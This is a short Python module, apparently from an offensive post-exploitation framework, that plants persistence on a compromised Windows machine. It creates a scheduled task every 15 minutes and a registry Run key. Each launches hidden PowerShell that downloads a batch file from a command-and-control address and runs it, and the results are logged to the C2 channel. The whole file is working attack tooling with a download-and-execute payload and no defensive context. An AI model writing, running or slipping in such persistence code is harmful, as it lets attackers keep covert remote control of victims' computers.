"""quantum.postexploit.persistx — multi-vector persistence staging."""
from __future__ import annotations

from quantum.core.logging import log
from quantum.core.opsec import run


def persistx():
    """PERSISTX: stage multi-vector persistence (schtasks + run key); MFP keeps
    firmware-level; this adds host-level redundancy on compromised Windows."""
    r1 = run('schtasks /create /tn "qcli-svc" /tr "powershell -w hidden -c '
             'iwr http://127.0.0.1:8443/s/default -UseBasicParsing -OutFile $env:TEMP\\a.bat;'
             ' $env:TEMP\\a.bat" /sc minute /mo 15 /f')
    r2 = run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
             '/v qcli /t REG_SZ /d "powershell -w hidden -c '
             'iwr http://127.0.0.1:8443/s/default -UseBasicParsing -OutFile %TEMP%\\a.bat; %TEMP%\\a.bat" /f')
    out = {"schtasks": r1.returncode, "runkey": r2.returncode}
    log(f"PERSISTX staged: {out}", "C2")
    return out
